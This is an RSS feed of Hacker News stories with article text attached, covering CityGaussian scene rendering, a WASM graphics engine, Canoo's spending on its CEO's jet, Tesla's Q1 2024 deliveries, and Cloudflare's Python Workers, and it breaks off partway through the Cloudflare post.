<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Tue, 02 Apr 2024 20:00:08 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[CityGaussian: Real-time high-quality large-scale scene rendering with Gaussians (165 pts)]]></title>
            <link>https://dekuliutesla.github.io/citygs/</link>
            <guid>39907876</guid>
            <pubDate>Tue, 02 Apr 2024 16:46:32 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://dekuliutesla.github.io/citygs/">https://dekuliutesla.github.io/citygs/</a>, See on <a href="https://news.ycombinator.com/item?id=39907876">Hacker News</a></p>
<div id="readability-page-1" class="page">


<div>
          
          <p>
            <span>
              He Guan<sup>1,2</sup>,</span>
            <span>
              Chuanchen Luo<sup>1</sup>,
            </span>
            <span>
              Lue Fan<sup>1,2</sup>,
            </span>
            <span>
              Junran Peng<sup>1</sup>,
            </span>
            <span>
              Zhaoxiang Zhang<sup>1,2,3,4</sup>,
            </span>
          </p>

          <p><span><sup>1</sup>Institute of Automation, Chinese Academy of Sciences</span>
            <span><sup>2</sup>University of Chinese Academy of Sciences (UCAS)</span>
            <span><sup>3</sup>Centre for Artificial Intelligence and Robotics (HKISI, CAS)</span>
            <span><sup>4</sup>State Key Laboratory of Multimodal Artificial Intelligence Systems (MAIS)</span>
          </p>

          
        </div>




<div>
        <h2>Abstract</h2>
        <p>
            The advancement of real-time 3D scene reconstruction and novel view synthesis has been 
            significantly propelled by 3D Gaussian Splatting (3DGS). However, effectively training 
            large-scale 3DGS and rendering it in real-time across various scales remains challenging. 
            This paper introduces CityGaussian (CityGS), which employs a novel divide-and-conquer 
            training approach and Level-of-Detail (LoD) strategy for efficient large-scale 3DGS 
            training and rendering. Specifically, the global scene prior and adaptive training data 
            selection enables efficient training and seamless fusion. Based on fused Gaussian primitives, 
            we generate different detail levels through compression, and realize fast rendering across 
            various scales through the proposed block-wise detail levels selection and aggregation 
            strategy. Extensive experimental results on large-scale scenes demonstrate that our approach 
            attains state-of-the-art rendering quality, enabling consistent real-time rendering of 
            large-scale scenes across vastly different scales.
          </p>
      </div>

<div>
      <h2>Comparison With SOTA</h2>
      <p><img alt="Architecture" src="https://dekuliutesla.github.io/citygs/static/images/table.png" width="100%">
    </p></div>


<div>

      <!-- CityGS: No LoD -->
      <div>
        <h2>CityGS: No LoD</h2>
        <div>
          <p>
              Without our proposed LoD technique, the MatrixCity is depicted by 25 million Gaussians. The consequent speed of 18 FPS (tested on A100) leads to unpleasant roaming experience.
            </p>

        </div>
      </div>
      <!--/ CityGS: No LoD. -->

      <!-- CityGS. -->
      <div>
          <h2>CityGS</h2>
          <p>
            With the support of LoD, our CityGS can be rendered in real-time under vastly different scales. The average speed is 36 FPS (tested on A100).
          </p>
          <!-- <video id="video_10m" autoplay controls muted loop playsinline height="100%">
            <source src="./static/videos/video_10m.mp4"
                    type="video/mp4">
          </video> -->
        </div>
      <!--/ CityGS. -->
      
    </div>

<div>
    <h2>Visual Comparisons</h2>
    
    
  </div>

<div id="BibTeX">
    <h2>BibTeX</h2>
    <pre><code>@misc{liu2024citygaussian,
      title={CityGaussian: Real-time High-quality Large-Scale Scene Rendering with Gaussians}, 
      author={Yang Liu and He Guan and Chuanchen Luo and Lue Fan and Junran Peng and Zhaoxiang Zhang},
      year={2024},
      eprint={2404.01133},
      archivePrefix={arXiv},
      primaryClass={cs.CV}
}</code></pre>
  </div>

<div>
        <h2>References</h2>

        <div>
          <p>
            [Turki 2022] Turki, H., Ramanan, D., Satyanarayanan, M.: Mega-nerf: Scalable construction of large-scale nerfs for virtual fly-throughs. In: Proceedings of the IEEE/CVF Conference on Computer Vision and Pattern Recognition. pp. 12922–12931 (2022)
          </p>
          <p>
            [Zhenxing 2022] Zhenxing, M., Xu, D.: Switch-nerf: Learning scene decomposition with mixture of experts for large-scale neural radiance fields. In: The Eleventh International Conference on Learning Representations (2022)
          </p>
          <p>
            [Yuqi 2023] Zhang, Y., Chen, G., Cui, S.: Efficient large-scale scene representation with a hybrid of high-resolution grid and plane features. arXiv preprint arXiv:2303.03003 (2023)
          </p>  
          <p>
            [Bernhard 2023] Kerbl, B., Kopanas, G., Leimkühler, T., Drettakis, G.: 3d gaussian splatting for real-time radiance field rendering. ACM Transactions on Graphics 42(4) (2023)
          </p>
        </div>
      </div>







</div>]]></description>
        </item>
        <item>
            <title><![CDATA[HNInternal: 3D + 2D: Testing out my cross-platform WASM graphics engine (112 pts)]]></title>
            <link>https://news.ycombinator.com/item?id=39907845</link>
            <guid>39907845</guid>
            <pubDate>Tue, 02 Apr 2024 16:44:32 GMT</pubDate>
            <description><![CDATA[<p>See on <a href="https://news.ycombinator.com/item?id=39907845">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><td><table>
        <tbody><tr id="39907845">
      <td><span></span></td>      <td><center><a id="up_39907845" href="https://news.ycombinator.com/vote?id=39907845&amp;how=up&amp;goto=item%3Fid%3D39907845"></a></center></td><td><span><a href="https://news.ycombinator.com/item?id=39907845">3D + 2D: Testing out my cross-platform WASM graphics engine</a></span></td></tr><tr><td colspan="2"></td><td><span>
          <span id="score_39907845">112 points</span> by <a href="https://news.ycombinator.com/user?id=seanisom">seanisom</a> <span title="2024-04-02T16:44:32"><a href="https://news.ycombinator.com/item?id=39907845">3 hours ago</a></span> <span id="unv_39907845"></span> | <a href="https://news.ycombinator.com/hide?id=39907845&amp;goto=item%3Fid%3D39907845">hide</a> | <a href="https://hn.algolia.com/?query=3D%20%2B%202D%3A%20Testing%20out%20my%20cross-platform%20WASM%20graphics%20engine&amp;type=story&amp;dateRange=all&amp;sort=byDate&amp;storyText=false&amp;prefix&amp;page=0">past</a> | <a href="https://news.ycombinator.com/fave?id=39907845&amp;auth=f4a205beed782d8a9c166da489fbeb136a787d7c">favorite</a> | <a href="https://news.ycombinator.com/item?id=39907845">34&nbsp;comments</a>        </span>
              </td></tr>
    <tr></tr><tr><td colspan="2"></td><td><div><p>I used to work at Adobe on the infrastructure powering big applications like Photoshop and  Acrobat. One of our worst headaches was making these really powerful codebases work on desktop, web, mobile, and the cloud without having to completely rewrite them.  For example, to get Lightroom and Photoshop working on the web we took a winding path through JavaScript, Google’s PNaCl, asm.js, and finally WebAssembly, all while having to rethink our GPU architecture around these devices. We even had to get single-threaded builds working and rebuild the UI around Web Components. Today the web builds work great, but it was a decade-long journey to get there!</p><p>The graphics stack continues to be one of the biggest bottlenecks in portability. One day I realized that WebAssembly (Wasm) actually held the solution to the madness. It’s runnable anywhere, embeddable into anything, and performant enough for real-time graphics. So I quit my job and dove into the adventure of creating a portable, embeddable WASM-based graphics framework from the ground up: high-level enough for app developers to easily make whatever graphics they want, and low-level enough to take full advantage of the GPU and everything else needed for a high-performance application.</p><p>I call it Renderlet to emphasize the embeddable aspect — you can make self-contained graphics modules that do just what you want, connect them together, and make them run <i>on</i> anything or <i>in</i> anything with trivial interop.</p><p>If you think of how Unity made it easy for devs to build cross-platform games, the idea is to do the same thing for all visual applications.</p><p>Somewhere along the way I got into YC as a solo founder (!) but mostly I’ve been heads-down building this thing for the last 6 months. It’s not <i>quite</i> ready for an open alpha release, but it’s close—close enough that I’m ready to write about it, show it off, and start getting feedback. This is the thing I dreamed of as an application developer, and I want to know what you think!</p><p>When Rive open-sourced their 2D vector engine and made a splash on HN a couple weeks ago (<a href="https://news.ycombinator.com/item?id=39766893">https://news.ycombinator.com/item?id=39766893</a>), I was intrigued. Rive’s renderer is built as a higher-level 2D API similar to SVG, whereas the Wander renderer (the open-source runtime part of Renderlet) exposes a lower-level 3D API over the GPU. Could Renderlet use its GPU backend to run the Rive Renderer library, enabling any 3D app to have a 2D vector backend? Yes it can - I implemented it!</p><p>You can see it working here: <a href="https://vimeo.com/929416955" rel="nofollow">https://vimeo.com/929416955</a> and there’s a deep technical dive here: <a href="https://github.com/renderlet/wander/wiki/Using-renderlet-with-rive%E2%80%90renderer">https://github.com/renderlet/wander/wiki/Using-renderlet-wit...</a>. The code for my runtime Wasm Renderer (a.k.a. Wander) is here: <a href="https://github.com/renderlet/wander">https://github.com/renderlet/wander</a>.</p><p>I’ll come back and do a proper Show HN or Launch HN when the compiler is ready for anyone to use and I have the integration working on all platforms, but I hope this is interesting enough to take a look at now. I want to hear what you think of this!</p></div></td></tr>        <tr></tr><tr><td colspan="2"></td><td><form action="comment" method="post"></form></td></tr>  </tbody></table>
  </td></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Canoo spent double its annual revenue on the CEO's private jet (254 pts)]]></title>
            <link>https://techcrunch.com/2024/04/01/canoo-spent-double-its-annual-revenue-on-the-ceos-private-jet-in-2023/</link>
            <guid>39906924</guid>
            <pubDate>Tue, 02 Apr 2024 15:33:38 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://techcrunch.com/2024/04/01/canoo-spent-double-its-annual-revenue-on-the-ceos-private-jet-in-2023/">https://techcrunch.com/2024/04/01/canoo-spent-double-its-annual-revenue-on-the-ceos-private-jet-in-2023/</a>, See on <a href="https://news.ycombinator.com/item?id=39906924">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
				<p id="speakable-summary">Tucked inside Canoo’s 2023 earnings report is a nugget regarding the use of CEO Tony Aquila’s private jet — just one of many expenses that<span> illustrates the gap between spending and revenue at the EV startup.</span></p>
<p>Canoo posted Monday its fourth-quarter and full-year earnings for 2023 in a <a href="https://ir.stockpr.com/canoo/sec-filings-email/content/0001628280-24-014075/goev-20231231.htm#i5cf4fcff5f5a4438b15ae9a52ca671ee_112" target="_blank" rel="noopener">regulatory filing</a> that shows a company burning through cash as it tries to scale up volume production of its commercial electric vehicles and avoid the same fate as other EV startups, like recently bankrupt <a href="https://techcrunch.com/tag/arrival/">Arrival</a>. The regulatory filing once again contained a “going concern” warning — which has <a href="https://techcrunch.com/2022/05/10/canoo-warns-it-may-not-have-enough-funds-to-bring-evs-to-market/" target="_blank" rel="noopener">persisted since 2022</a> — as well as some progress on the expenses and revenue fronts.</p>
<p><span>The company generated $886,000 in revenue in 2023 compared to zero dollars in 2022, as the company delivered 22 vehicles to entities like NASA and the state of Oklahoma. And it did reduce its loss from operations by nearly half, from $506 million in 2022 to $267 million in 2023. </span><span>The revenue-to-losses gap is still considerable though: The company reported total net losses of $302.6 million in 2023.&nbsp;</span></p>
<p>Still, one only needs to look at what Canoo is paying to rent the CEO’s private jet to put those “wins” into perspective. Under a deal reached in November 2020, Canoo reimburses Aquila Family Ventures, an entity owned by the CEO, for use of an aircraft. In 2023, Canoo spent $1.7 million on this reimbursement — that’s double the amount of revenue it generated. Canoo paid Aquila Family Ventures $1.3 million in 2022 and $1.8 million in 2021 for use of the aircraft.</p>
<p>Separately, Canoo also paid Aquila Family Ventures $1.7 million in 2023, $1.1 million in 2022 and $500,000 in 2021 for shared services support in its Justin, Texas, corporate office facility, according to regulatory filings.</p>
<p>This could be chalked up to small monetary potatoes&nbsp;if&nbsp;Canoo reaches its revenue forecast for 2024 of $50 million to $100 million.</p>
<p>We’ve asked Canoo for comment and will update this post if we hear back.</p>
			</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Tesla releases Q1 2024 deliveries: disastrous results (140 pts)]]></title>
            <link>https://electrek.co/2024/04/02/tesla-releases-q1-2024-deliveries-disastrous-results/</link>
            <guid>39906147</guid>
            <pubDate>Tue, 02 Apr 2024 14:29:15 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://electrek.co/2024/04/02/tesla-releases-q1-2024-deliveries-disastrous-results/">https://electrek.co/2024/04/02/tesla-releases-q1-2024-deliveries-disastrous-results/</a>, See on <a href="https://news.ycombinator.com/item?id=39906147">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
					
<figure>
	<img width="1600" height="818" src="https://electrek.co/wp-content/uploads/sites/3/2021/12/Tesla-all-casrs-hero.jpg?quality=82&amp;strip=all&amp;w=1600" alt="Tesla all cars hero" srcset="https://i0.wp.com/electrek.co/wp-content/uploads/sites/3/2021/12/Tesla-all-casrs-hero.jpg?w=320&amp;quality=82&amp;strip=all&amp;ssl=1 320w, https://i0.wp.com/electrek.co/wp-content/uploads/sites/3/2021/12/Tesla-all-casrs-hero.jpg?w=640&amp;quality=82&amp;strip=all&amp;ssl=1 640w, https://i0.wp.com/electrek.co/wp-content/uploads/sites/3/2021/12/Tesla-all-casrs-hero.jpg?w=1024&amp;quality=82&amp;strip=all&amp;ssl=1 1024w, https://i0.wp.com/electrek.co/wp-content/uploads/sites/3/2021/12/Tesla-all-casrs-hero.jpg?w=1500&amp;quality=82&amp;strip=all&amp;ssl=1 1500w" decoding="async" fetchpriority="high"></figure>

<p>Tesla has released its Q1 2024 delivery and production numbers: confirming the suspicion that it is not growing anymore.</p>



<p>It’s even worse than most people anticipated.</p>



<h2 id="h-tesla-q1-2024-expectations">Tesla Q1 2024 Expectations</h2>



<p>As we have been reporting in the last few weeks,<a href="https://electrek.co/2024/03/28/tesla-tsla-delivery-estimates-all-over-the-place/" target="_blank" rel="noreferrer noopener"> the expectations for Tesla’s Q1 2024 deliveries are all over the place</a>.</p>



<p>Last month, the Wall Street consensus was around 470,000 deliveries, but it has been consistently revised down over the last few weeks as many of them now expect quite a disastrous quarter compared to the previous one.</p>



<p>As of today, the consensus is 431,000 deliveries.</p>



<p>In comparison, Tesla had record deliveries of 484,507 vehicles last quarter for a 20% year-over-year growth rate, and it delivered 422,875 in Q1 2023.</p>



<p>431,000 deliveries would still be a small growth year-over-ear, but it would be a massive quarter-to-quarter drop.</p>



<h2 id="h-tesla-q1-2024-delivery-and-production-results">Tesla Q1 2024 Delivery and Production Results</h2>



<p>Today, Tesla released its official Q1 2024 delivery and production results – confirming 386,810 deliveries for the first quarter of the year.</p>



<figure><table><tbody><tr><td>&nbsp;</td><td><strong>Production</strong></td><td><strong>Deliveries</strong></td><td><strong>Subject to operating lease accounting</strong></td></tr><tr><td>Model 3/Y</td><td>412,376</td><td>369,783</td><td>2%</td></tr><tr><td>Other Models</td><td>20,995</td><td>17,027</td><td>1%</td></tr><tr><td><strong>Total</strong></td><td>433,371</td><td>386,810</td><td><strong>2%</strong></td></tr></tbody></table></figure>



<p>Tesla listed several excuses for the big delivery miss:</p>



<blockquote>
<p>Decline in volumes was partially due to the early phase of the production ramp of the updated Model 3 at our Fremont factory and factory shutdowns resulting from shipping diversions caused by the Red Sea conflict and an arson attack at Gigafactory Berlin.</p>
</blockquote>




	<p>Tesla’s stock dropped by as much as 7% in pre-market trading following the release.</p>



<h2 id="h-electrek-s-take">Electrek’s Take</h2>



<p>This is next-level bad. Even the most pessimistic analysts didn’t come close to predicting this level of deliveries.</p>



<p>All these excuses that Tesla is listing are good excuses, but they are good for the lower production levels. They don’t explain the ~50,000-vehicle discrepancy between production and deliveries. That’s a demand problem. As clear as it gets.</p>



<p>I think this should be a wake-up call. This is Tesla going back about two years in terms of demand.</p>
	<p>
		<a target="_blank" rel="nofollow" href="https://news.google.com/publications/CAAqBwgKMKqD-Qow6c_gAg?hl=en-US&amp;gl=US&amp;ceid=US:en">
			<em>Add Electrek to your Google News feed.</em>&nbsp;
					</a>
	</p>
	<div><p><em>FTC: We use income earning auto affiliate links.</em> <a href="https://electrek.co/about/#affiliate">More.</a></p><p><a href="https://bit.ly/3J2J0VP"><img src="https://electrek.co/wp-content/uploads/sites/3/2024/04/Electrek-banner-750x150-B-1.jpg?quality=82&amp;strip=all" alt="" width="750" height="150"></a></p></div>				</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Python Cloudflare Workers (289 pts)]]></title>
            <link>https://blog.cloudflare.com/python-workers</link>
            <guid>39905441</guid>
            <pubDate>Tue, 02 Apr 2024 13:20:21 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.cloudflare.com/python-workers">https://blog.cloudflare.com/python-workers</a>, See on <a href="https://news.ycombinator.com/item?id=39905441">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="post"><article><p>04/02/2024</p><section><p>16 min read</p><div><figure><img src="https://blog.cloudflare.com/content/images/2024/04/pythonweba.png" alt="" loading="lazy" width="1600" height="900"></figure><p>Starting today, in open beta, you can now <a href="https://developers.cloudflare.com/workers/languages/python/">write Cloudflare Workers in Python</a>.</p><p>This new support for Python is different from how Workers have historically supported languages beyond JavaScript — in this case, we have directly integrated a Python implementation into <a href="https://github.com/cloudflare/workerd">workerd</a>, the open-source Workers runtime. All <a href="https://developers.cloudflare.com/workers/configuration/bindings/">bindings</a>, including bindings to <a href="https://developers.cloudflare.com/vectorize/">Vectorize</a>, <a href="https://developers.cloudflare.com/workers-ai/">Workers AI</a>, <a href="https://developers.cloudflare.com/r2/">R2</a>, <a href="https://developers.cloudflare.com/durable-objects/">Durable Objects</a>, and more are supported on day one. Python Workers can import a subset of popular Python <a href="https://developers.cloudflare.com/workers/languages/python/packages/">packages</a> including <a href="https://fastapi.tiangolo.com/">FastAPI</a>, <a href="https://python.langchain.com/docs/get_started/introduction">Langchain</a>, <a href="https://numpy.org/">Numpy</a> and more. There are no extra build steps or external toolchains.</p><p>To do this, we’ve had to push the bounds of all of our systems, from the runtime itself, to our deployment system, to the contents of the Worker bundle that is published across our <a href="https://www.cloudflare.com/network/">network</a>. You can <a href="https://developers.cloudflare.com/workers/languages/python/">read the docs</a>, and start using it today.</p><p>We want to use this post to pull back the curtain on the internal lifecycle of a Python Worker, share what we’ve learned in the process, and highlight where we’re going next.</p><h2 id="beyond-%E2%80%9Cjust-compile-to-webassembly%E2%80%9D">Beyond “Just compile to WebAssembly”</h2><p>Cloudflare Workers have supported WebAssembly <a href="https://blog.cloudflare.com/webassembly-on-cloudflare-workers">since 2018</a> — each Worker is a <a href="https://developers.cloudflare.com/workers/reference/how-workers-works/">V8 isolate</a>, powered by the same JavaScript engine as the Chrome web browser. In principle, it’s been <a href="https://blog.cloudflare.com/webassembly-on-cloudflare-workers">possible</a> for years to write Workers in any language — including Python — so long as it first compiles to WebAssembly or to JavaScript.</p><p>In practice, just because something is possible doesn’t mean it’s simple. And just because “hello world” works doesn’t mean you can reliably build an application. Building full applications requires supporting an ecosystem of packages that developers are used to building with. For a platform to truly support a programming language, it’s necessary to go much further than showing how to compile code using external toolchains.</p><p>Python Workers are different from what we’ve done in the past. It’s early, and still in beta, but we think it shows what providing first-class support for programming languages beyond JavaScript can look like on Workers.</p><h2 id="the-lifecycle-of-a-python-worker">The lifecycle of a Python Worker</h2><p>With Pyodide now <a href="https://github.com/cloudflare/workerd/tree/main/src/pyodide">built into workerd</a>, you can write a Worker like this:</p><pre><code>from js import Response

async def on_fetch(request, env):
    return Response.new("Hello world!")</code></pre><p>...with a wrangler.toml file that points to a .py file:</p><pre><code>name = "hello-world-python-worker"
main = "src/entry.py"
compatibility_date = "2024-03-18"
compatibility_flags = ["python_workers"]</code></pre><p>…and when you run <a href="https://developers.cloudflare.com/workers/wrangler/commands/#dev">npx wrangler@latest dev</a>, the Workers runtime will:</p><ol><li>Determine which <a href="https://developers.cloudflare.com/workers/languages/python/packages/">version of Pyodide</a> is required, based on your <a href="https://developers.cloudflare.com/workers/configuration/compatibility-dates/">compatibility date</a></li><li>Create an isolate for your Worker, and automatically inject Pyodide</li><li>Serve your Python code using Pyodide</li></ol><p>This all happens under the hood — no extra toolchain or precompilation steps needed. The Python execution environment is provided for you, mirroring how Workers written in JavaScript already work. </p><h2 id="a-python-interpreter-built-into-the-workers-runtime">A Python interpreter built into the Workers runtime</h2><p>Just as JavaScript has <a href="https://en.wikipedia.org/wiki/List_of_ECMAScript_engines">many engines</a>, Python has <a href="https://wiki.python.org/moin/PythonImplementations">many implementations</a> that can execute Python code. <a href="https://github.com/python/cpython">CPython</a> is the reference implementation of Python. If you’ve used Python before, this is almost certainly what you’ve used, and is commonly referred to as just “Python”.</p><p><a href="https://pyodide.org/en/stable/">Pyodide</a> is a port of CPython to WebAssembly. It interprets Python code, without any need to precompile the Python code itself to any other format. It runs in a web browser — check out this <a href="https://pyodide-console.pages.dev/">REPL</a>. It is true to the CPython that Python developers know and expect, providing <a href="https://ggu-python.cloudflare-docs-7ou.pages.dev/workers/languages/python/stdlib">most of the Python Standard Library</a>. It provides a foreign function interface (FFI) to JavaScript, allowing you to call JavaScript APIs directly from Python — more on this below. It provides popular open-source <a href="https://developers.cloudflare.com/workers/languages/python/packages/">packages</a>, and can import pure Python packages directly from PyPI.</p><p>Pyodide struck us as the perfect fit for Workers. It is designed to allow the core interpreter and each native Python module to be built as separate WebAssembly modules, dynamically linked at runtime. This allows the code footprint for these modules to be shared among all Workers running on the same machine, rather than requiring each Worker to bring its own copy. This is essential to making WebAssembly work well in the Workers environment, where we often run <a href="https://www.infoq.com/presentations/cloudflare-v8/">thousands of Workers per machine</a> — we need Workers using the same programming language to share their runtime code footprint. Running thousands of Workers on every machine is what makes it possible for us to deploy every application in every location at a <a href="https://blog.cloudflare.com/workers-pricing-scale-to-zero">reasonable price</a>.</p><p>Just like with JavaScript Workers, with Python Workers we provide the runtime for you:</p><figure><img src="https://blog.cloudflare.com/content/images/2024/04/VMs--Containers--ans-Isolates-comparison.png" alt="" loading="lazy" width="1600" height="798"></figure><p>Pyodide is currently the exception — most languages that target WebAssembly do not yet support dynamic linking, so each application ends up bringing its own copy of its language runtime. We hope to see more languages support dynamic linking in the future, so that we can more effectively bring them to Workers.</p><h3 id="how-pyodide-works">How Pyodide works</h3><p>Pyodide executes Python code in WebAssembly, which is a sandboxed environment, separated from the host runtime. Unlike running native code, all operations outside of pure computation (such as file reads) must be provided by a runtime environment, then <em>imported</em> by the WebAssembly module. </p><p><a href="https://llvm.org/">LLVM</a> provides three target triples for WebAssembly:</p><ol><li><strong>wasm32-unknown-unknown</strong> – this backend provides no C standard library or system call interface; to support this backend, we would need to manually rewrite every system or library call to make use of imports we would define ourselves in the runtime.</li><li><strong>wasm32-wasi</strong> – WASI is a standardized system interface, and defines a standard set of imports that are implemented in WASI runtimes such as <a href="https://github.com/bytecodealliance/wasmtime/">wasmtime</a>.</li><li><strong>wasm32-unknown-emscripten</strong> – Like WASI, Emscripten defines the imports that a WebAssembly program needs to execute, but also outputs an accompanying JavaScript library that implements these imported functions.</li></ol><p>Pyodide uses Emscripten, and provides three things:</p><ol><li>A distribution of the CPython interpreter, compiled using Emscripten</li><li>A foreign function interface (FFI) between Python and JavaScript</li><li>A set of third-party Python packages, compiled using Emscripten’s compiler to WebAssembly. </li></ol><p>Of these targets, only Emscripten currently supports dynamic linking, which, as we noted above, is essential to providing a shared language runtime for Python that is shared across isolates. Emscripten does this by <a href="https://emscripten.org/docs/compiling/Dynamic-Linking.html">providing implementations of dlopen and dlsym,</a> which use the accompanying JavaScript library to modify the WebAssembly program’s table to link additional WebAssembly-compiled modules at runtime. WASI <a href="https://github.com/WebAssembly/component-model/blob/main/design/mvp/examples/SharedEverythingDynamicLinking.md#runtime-dynamic-linking">does not yet support</a> the dlopen/dlsym dynamic linking abstractions used by CPython.</p><h2 id="pyodide-and-the-magic-of-foreign-function-interfaces-ffi">Pyodide and the magic of foreign function interfaces (FFI)</h2><p>You might have noticed that in our Hello World Python Worker, we import Response from the js module:</p><pre><code>from js import Response

async def on_fetch(request, env):
    return Response.new("Hello world!")</code></pre><p>Why is that?</p><p>Most Workers are written in JavaScript, and most of our engineering effort on the Workers runtime goes into improving JavaScript Workers. There is a risk in adding a second language that it might never reach feature parity with the first language and always be a second class citizen. Pyodide’s foreign function interface (FFI) is critical to avoiding this by providing access to all JavaScript functionality from Python. This can be used by the Worker author directly, and it is also used to make packages like <a href="https://developers.cloudflare.com/workers/languages/python/packages/fastapi/">FastAPI</a> and <a href="https://developers.cloudflare.com/workers/languages/python/packages/langchain/">Langchain</a> work out-of-the-box, as we’ll show later in this post.</p><p>An FFI is a system for calling functions in one language that are implemented in another language. In most cases, an FFI is defined by a "higher-level" language in order to call functions implemented in a systems language, often C. Python’s <a href="https://docs.python.org/3/library/ctypes.html#module-ctypes">ctypes module</a> is such a system. These sorts of foreign function interfaces are often difficult to use because of the nature of C APIs.</p><p>Pyodide’s foreign function interface is an interface between Python and JavaScript, which are two high level object-oriented languages with a lot of design similarities. When passed from one language to another, immutable types such as strings and numbers are transparently translated. All mutable objects are wrapped in an appropriate proxy.</p><p>When a JavaScript object is passed into Python, Pyodide determines which JavaScript protocols the object supports and <a href="https://github.com/pyodide/pyodide/blob/main/src/core/jsproxy.c#L3781-L3791">dynamically constructs</a> an appropriate Python class that implements the corresponding Python protocols. For example, if the JavaScript object supports the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Iteration_protocols">JavaScript iteration protocol</a> then the proxy will support the <a href="https://docs.python.org/3/library/stdtypes.html#iterator-types">Python iteration protocol</a>. If the JavaScript object is a Promise or other <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise#thenables">thenable</a>, the Python object will be an <a href="https://docs.python.org/3/reference/datamodel.html#awaitable-objects">awaitable</a>.</p><pre><code>from js import JSON

js_array = JSON.parse("[1,2,3]")

for entry in js_array:
   print(entry)</code></pre><p>The lifecycle of a request to a Python Worker makes use of Pyodide’s FFI, wrapping the incoming JavaScript <a href="https://developers.cloudflare.com/workers/runtime-apis/request/">Request</a> object in a <a href="https://pyodide.org/en/stable/usage/api/python-api/ffi.html#pyodide.ffi.JsProxy">JsProxy</a> object that is accessible in your Python code. It then converts the value returned by the Python Worker’s <a href="https://developers.cloudflare.com/workers/runtime-apis/handlers/">handler</a> into a JavaScript <a href="https://developers.cloudflare.com/workers/runtime-apis/response/">Response</a> object that can be delivered back to the client:</p><figure><img src="https://blog.cloudflare.com/content/images/2024/04/Python-Worker-Request-Lifecycle.png" alt="" loading="lazy" width="978" height="400"></figure><h2 id="why-dynamic-linking-is-essential-and-static-linking-isn%E2%80%99t-enough">Why dynamic linking is essential, and static linking isn’t enough</h2><p>Python comes with <a href="https://cffi.readthedocs.io/en/stable/">a C FFI</a>, and many Python packages use this FFI to import native libraries. These libraries are typically written in C, so they must first be compiled down to WebAssembly in order to work on the Workers runtime. As we noted above, Pyodide is built with Emscripten, which overrides Python’s C FFI — any time a package tries to load a native library, it is instead loaded from a WebAssembly module that is provided by the Workers runtime. Dynamic linking is what makes this possible — it is what lets us override Python’s C FFI, allowing Pyodide to support many <a href="https://developers.cloudflare.com/workers/languages/python/packages/">Python packages</a> that have native library dependencies.</p><p>Dynamic linking is “pay as you go”, while static linking is “pay upfront” — if code is statically linked into your binary, it must be loaded upfront in order for the binary to run, even if this code is never used.</p><figure><img src="https://blog.cloudflare.com/content/images/2024/04/Python-Workers---Runtime.png" alt="" loading="lazy" width="772" height="400"></figure><p>Dynamic linking enables the Workers runtime to share the underlying WebAssembly modules of packages across different Workers that are running on the same machine.</p><p>We won’t go too much into detail on <a href="https://emscripten.org/docs/compiling/Dynamic-Linking.html#runtime-dynamic-linking-with-dlopen">how dynamic linking works in Emscripten</a>, but the main takeaway is that the Emscripten runtime fetches WebAssembly modules from a filesystem abstraction provided in JavaScript. For each Worker, we generate a filesystem at runtime, whose structure mimics a Python distribution that has the Worker’s dependencies installed, but whose underlying files are shared between Workers. This makes it possible to share Python and WebAssembly files between multiple Workers that import the same dependency. Today, we’re able to share these files across Workers, but copy them into each new isolate. We think we can go even further, by employing <a href="https://en.wikipedia.org/wiki/Copy-on-write">copy-on-write</a> techniques to share the underlying resource across many Workers.</p><h2 id="supporting-server-and-client-libraries">Supporting Server and Client libraries</h2><p>Python has a wide variety of popular HTTP client libraries, including <a href="https://www.python-httpx.org/">httpx</a>, <a href="https://pypi.org/project/urllib3/">urllib3</a>, <a href="https://pypi.org/project/requests/">requests</a> and more. Unfortunately, none of them work out of the box in Pyodide. Adding support for these has been one of the longest running user requests for the Pyodide project. The Python HTTP client libraries all work with raw sockets, and the browser security model and CORS do not allow this, so we needed another way to make them work in the Workers runtime.</p><h3 id="async-client-libraries">Async Client libraries</h3><p>For libraries that can make requests asynchronously, including <a href="https://docs.aiohttp.org/en/stable/index.html">aiohttp</a> and <a href="https://www.python-httpx.org/">httpx</a>, we can use the <a href="https://developers.cloudflare.com/workers/runtime-apis/fetch/">Fetch API</a> to make requests. We do this by patching the library, instructing it to use the Fetch API from JavaScript — taking advantage of Pyodide’s FFI. <a href="https://github.com/cloudflare/pyodide/blob/main/packages/httpx/httpx_patch.py">The httpx patch</a> ends up quite simple —fewer than 100 lines of code. Simplified even further, it looks like this:<br></p><pre><code>from js import Headers, Request, fetch

def py_request_to_js_request(py_request):
    js_headers = Headers.new(py_request.headers)
    return Request.new(py_request.url, method=py_request.method, headers=js_headers)

def js_response_to_py_response(js_response):
  ... # omitted

async def do_request(py_request):
  js_request = py_request_to_js_request(py_request)
    js_response = await fetch(js_request)
    py_response = js_response_to_py_response(js_response)
